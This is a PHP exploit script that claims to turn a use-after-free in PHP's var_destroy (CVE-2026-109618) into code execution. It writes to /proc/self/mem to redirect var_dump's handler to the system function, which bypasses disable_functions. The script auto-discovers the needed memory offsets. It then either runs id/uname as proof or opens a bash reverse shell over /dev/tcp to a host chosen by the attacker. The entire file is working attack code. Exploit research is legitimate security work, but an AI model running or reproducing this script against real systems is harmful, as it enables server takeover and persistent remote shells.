<?php
// Chain B (adapted & self-calibrating): function-handler overwrite -> RCE.
// The var_destroy UAF (CVE-2026-109618) gives an attacker an arbitrary
// read/write primitive; here we demonstrate the escalation it enables
// (overwrite a benign function's handler with zif_system) using /proc/self/mem
// so it runs standalone. No hardcoded struct offsets: executor_globals offset
// is resolved per-binary, and function_table + the internal-function handler
// offset are auto-discovered. Also bypasses disable_functions=system.
// Technique by Qi Deng (ikow/php2shell-poc, MIT); generalized/self-calibrating here.
error_reporting(0);

$EG_OFF = (int)(getenv('EG_OFF') ?: ($argv[1] ?? 0x16e2020));
$maps = file_get_contents('/proc/self/maps');

$base = 0;
foreach (explode("\n", $maps) as $l)
    if (preg_match('#^([0-9a-f]+)-[0-9a-f]+\s+r--p\s+0*\s.*/php$#', $l, $m)) { $base = hexdec($m[1]); break; }
if (!$base) die("[-] no php base\n");

// executable ranges (to recognise code pointers = function handlers)
$exec = [];
foreach (explode("\n", $maps) as $l)
    if (preg_match('#^([0-9a-f]+)-([0-9a-f]+)\s+r-xp#', $l, $m))
        $exec[] = [hexdec($m[1]), hexdec($m[2])];
$is_code = function($p) use ($exec) { foreach ($exec as $r) if ($p >= $r[0] && $p < $r[1]) return true; return false; };

$fp = fopen('/proc/self/mem', 'rb');
function q($fp,$a){ fseek($fp,$a); $d=fread($fp,8); return strlen($d)==8?unpack('Q',$d)[1]:0; }
function v($fp,$a){ fseek($fp,$a); $d=fread($fp,4); return strlen($d)==4?unpack('V',$d)[1]:0; }

$eg = $base + $EG_OFF;
$fa_system = 0; $fa_vardump = 0;
for ($off=0x80; $off<=0x600 && !($fa_system && $fa_vardump); $off+=8) {
    $ft = q($fp,$eg+$off);
    if ($ft < 0x10000) continue;
    $a = q($fp,$ft+16); $n = v($fp,$ft+24);
    if ($a < 0x10000 || $n < 100 || $n > 500000) continue;
    $s=0; $d=0;
    for ($i=0; $i<$n; $i++) {
        $kp = q($fp,$a+$i*32+24);
        if ($kp < 0x1000) continue;
        fseek($fp,$kp+24); $name = fread($fp,10);
        if (strncmp($name,"system\x00",7)===0)   $s = q($fp,$a+$i*32);
        if (strncmp($name,"var_dump\x00",9)===0)  $d = q($fp,$a+$i*32);
        if ($s && $d) break;
    }
    if ($s && $d) { $fa_system=$s; $fa_vardump=$d; }
}
if (!$fa_system || !$fa_vardump) { fclose($fp); die("[-] function_table not found\n"); }

// discover the internal-function handler offset: first code pointer in the struct
$handler_off = 0; $zif_system = 0;
for ($o=0x38; $o<=0x88; $o+=8) {
    $p = q($fp,$fa_system+$o);
    if ($is_code($p)) { $handler_off=$o; $zif_system=$p; break; }
}
fclose($fp);
$vardump_handler = $fa_vardump + $handler_off;
$zif_vardump = q(fopen('/proc/self/mem','rb'), $vardump_handler);

fprintf(STDERR, "[*] base=0x%x eg=0x%x fa_system=0x%x fa_var_dump=0x%x handler_off=0x%x zif_system=0x%x\n",
        $base, $eg, $fa_system, $fa_vardump, $handler_off, $zif_system);
if (!$handler_off || !$zif_system) die("[-] handler offset not resolved\n");

$w = fopen('/proc/self/mem','r+b'); fseek($w,$vardump_handler); fwrite($w,pack('Q',$zif_system)); fclose($w);
// Reverse shell mode: set LHOST (and optional LPORT) in the environment.
// var_dump now dispatches to system(), so this sends a bash reverse shell.
$LHOST = getenv('LHOST'); $LPORT = getenv('LPORT') ?: '4444';
if ($LHOST) {
    fprintf(STDERR, "[*] reverse shell -> %s:%s (start your listener first)\n", $LHOST, $LPORT);
    @var_dump("bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'");   // blocks while the shell is live
} else {
    @unlink('/tmp/.rce');
    @var_dump('id > /tmp/.rce 2>&1; uname -sr >> /tmp/.rce 2>&1');
    usleep(200000);
    $proof = @file_get_contents('/tmp/.rce');
    if ($proof) fprintf(STDERR, "[+] var_destroy UAF -> RCE CONFIRMED (disable_functions bypassed)\n%s\n", trim($proof));
    else fprintf(STDERR, "[-] no proof\n");
    $w = fopen('/proc/self/mem','r+b'); fseek($w,$vardump_handler); fwrite($w,pack('Q',$zif_vardump)); fclose($w);
    @unlink('/tmp/.rce');
}
